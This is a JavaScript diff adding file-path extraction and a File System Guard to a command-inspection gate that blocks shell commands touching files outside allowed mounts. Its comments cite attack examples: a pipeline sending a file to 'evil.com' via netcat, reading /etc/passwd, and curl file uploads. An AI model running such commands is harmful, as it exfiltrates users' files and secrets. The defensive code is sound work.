@@ -29,7 +29,63 @@ const sensitive = require('./sensitive');
 const commands = require('./commands');
 const policy = require('./policy');
 const activity = require('./activity');
+const fsguard = require('./fsguard');
 const { normalizeDomain, domainMatches } = require('./domains');
+
+// Split a shell line the same way the command classifier does so a pipeline
+// like `cat <ws>/a | nc evil.com 80` yields per-segment file candidates.
+const SEGMENT_RE = /(?:\|\||&&|\||;)/;
+
+// Tokens that are shell plumbing, never file paths.
+const REDIR_RE = /^[0-9]*[<>]+.*$/;
+const URL_RE = /^[a-z][a-z0-9+.-]*:\/\/+/i;
+
+/**
+ * Extract candidate local file paths from a shell command line.
+ * Conservative: only tokens containing `/` or `\` or starting with `~`
+ * are considered (absolute paths, ~/..., ./..., ../..., a/b). Bare
+ * hostnames (`evil.com`), ports (`80`), flags (`-la`) and URLs are skipped
+ * so network gates keep their own verdicts. `key=value` / `file=@path`
+ * wrappers (curl -F) are unwrapped to the path after `=` / `@`.
+ * The argv[0] command name of each segment is never treated as a path.
+ *
+ * @param {string|string[]} input
+ * @returns {string[]}
+ */
+function extractFsPaths(input) {
+  const raw = Array.isArray(input) ? input.join(' ') : String(input || '');
+  if (!raw.trim()) return [];
+  const out = [];
+  for (const segment of raw.split(SEGMENT_RE)) {
+    const argv = commands.tokenizeSegment(segment);
+    if (argv.length === 0) continue;
+    // Skip the command itself (argv[0] after wrappers still resolves via
+    // baseCommand, but argv[1..] are the only possible file operands).
+    const args = argv.slice(1);
+    for (let tok of args) {
+      if (!tok) continue;
+      if (tok === '<' || tok === '>' || tok === '>>' || tok === '<<') continue;
+      if (REDIR_RE.test(tok)) continue;
+      if (tok.startsWith('-')) continue;
+      // Unwrap VAR=path and file=@path forms (curl -F "file=@~/x").
+      const eq = tok.lastIndexOf('=');
+      if (eq !== -1 && eq < tok.length - 1) tok = tok.slice(eq + 1);
+      const at = tok.lastIndexOf('@');
+      if (at !== -1 && at < tok.length - 1 && /[/\\~]/.test(tok.slice(at + 1))) tok = tok.slice(at + 1);
+      // Remote targets are not local files: user@host:/remote, user@host.
+      if (tok.includes('@')) continue;
+      if (URL_RE.test(tok)) continue;
+      // Strip trailing shell punctuation (e.g. `scp a b:`).
+      tok = tok.replace(/[,:;]+$/, '');
+      if (!tok) continue;
+      if (!(tok.includes('/') || tok.includes('\\') || tok.startsWith('~'))) continue;
+      // Skip host:port shapes (10.0.0.1:443) — network, not files.
+      if (/^[^/\\:@\s]+:[0-9]+$/.test(tok)) continue;
+      out.push(tok);
+    }
+  }
+  return [...new Set(out)];
+}
 
 // The allow/log/block/require_auth tail shared by both gates. Returns the same
 // shape as the old IPC handlers: { allowed, action, types, reason } where
@@ -79,6 +135,12 @@ async function inspectAction(payload, ctx = {}) {
 // protection is OFF the gate does not stand in the way; while degraded it
 // refuses (fail-closed). Only a bridge/native host that routes commands
 // through Auren hits this gate — the pf firewall covers everything else.
+//
+// File System Guard enforcement: while protection is ON and a fsGuard policy
+// is present in ctx, any local file operand outside the allowed mounts (or
+// matching a forced exclusion) denies the whole command — even when the
+// command itself is network-benign (`open /etc/passwd`, `cat /tmp/other`).
+// Commands without file operands (e.g. `ls -la`) are unaffected.
 async function inspectCommand(cmd, ctx = {}) {
   if (ctx.degraded || ctx.failClosed) {
     if (ctx.logFn) ctx.logFn(activity.makeEntry('command', 'blocked', null, 'enforcement degraded'));
@@ -89,6 +151,29 @@ async function inspectCommand(cmd, ctx = {}) {
     return { allowed: true, action: 'allow', types: [], reason: 'protection off' };
   }
   const signal = commands.classifyCommand(cmd);
+  // FS containment applies on top of the network classification.
+  if (ctx.fsGuard) {
+    const candidates = extractFsPaths(cmd);
+    for (const p of candidates) {
+      let res;
+      try {
+        res = fsguard.isAccessAllowed(p, ctx.fsGuard);
+      } catch {
+        res = { allowed: false, canonical: null, reason: 'file guard error — default deny' };
+      }
+      if (!res.allowed) {
+        const types = [...new Set([...signal.types, 'fs_denied'])];
+        const label = res.canonical || p;
+        const reason = 'file access outside allowed mounts: ' + label + ' — ' + res.reason;
+        if (ctx.logFn) ctx.logFn(activity.makeEntry('command', 'blocked', null, 'fs blocked: ' + reason.slice(0, 200)));
+        if (ctx.notifyFn) ctx.notifyFn();
+        const out = { allowed: false, action: 'block', types, reason };
+        if (res.rule) out.rule = res.rule;
+        if (res.canonical) out.canonical = res.canonical;
+        return out;
+      }
+    }
+  }
   const decision = policy.decidePolicy(signal, { degraded: false, rules: ctx.commandRules });
   const typesLabel = signal.types.join(', ') || 'network access';
   const reason = 'Approve running a network-capable command (' + typesLabel + ')';
@@ -104,4 +189,4 @@ function isBlocked(domain, ctx = {}) {
   return (ctx.blocklist || []).some((x) => domainMatches(d, x));
 }
 
-module.exports = { inspectAction, inspectCommand, isBlocked };
+module.exports = { inspectAction, inspectCommand, isBlocked, extractFsPaths };
